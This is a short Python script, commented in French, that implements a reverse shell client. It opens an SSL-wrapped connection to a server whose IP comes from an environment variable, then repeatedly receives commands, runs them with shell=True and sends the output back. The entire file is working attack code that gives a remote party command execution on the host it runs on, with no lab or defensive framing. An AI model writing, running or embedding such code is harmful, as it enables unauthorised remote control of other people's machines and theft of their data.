import socket
import ssl
import subprocess
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

load_dotenv()
ip_server = os.getenv('IP_SERVER')

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
context = ssl.create_default_context()

# Envelopper le socket avec SSL
secure_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
secure_socket.connect((ip_server, SERVER_PORT))

while True:
    command = secure_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    secure_socket.send(result.stdout.encode() + result.stderr.encode())

secure_socket.close()
